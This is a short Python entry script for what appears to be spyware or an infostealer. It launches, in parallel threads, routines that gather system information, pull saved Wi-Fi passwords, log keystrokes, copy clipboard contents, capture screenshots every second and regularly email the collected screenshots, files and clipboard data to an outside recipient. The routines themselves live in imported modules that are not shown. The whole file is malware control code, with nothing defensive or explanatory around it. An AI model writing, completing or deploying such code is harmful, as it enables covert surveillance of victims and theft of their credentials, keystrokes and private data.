import os
import time
from concurrent.futures import ThreadPoolExecutor
from data_collection import computer_information, wifi_passwords, copy_clipboard,keylogger
from screenshot_capture import periodic_screenshot_capture
from send_email import send_emails_periodically

# Function to trigger all operations concurrently
def start_program():
    with ThreadPoolExecutor(max_workers=6) as executor:
        # Start data collection (computer info and wifi passwords)
        executor.submit(computer_information)
        executor.submit(wifi_passwords)
        
        #start the logging keystrokes
        executor.submit(keylogger)

        # Start copying clipboard data
        executor.submit(copy_clipboard)  

        # Start periodic screenshot capture
        executor.submit(periodic_screenshot_capture, 1)  # Capture screenshots every 1 second

        # Start sending emails periodically (screenshots, encrypted files, clipboard PDF)
        executor.submit(send_emails_periodically)

# Main execution
if __name__ == "__main__":
    start_program()

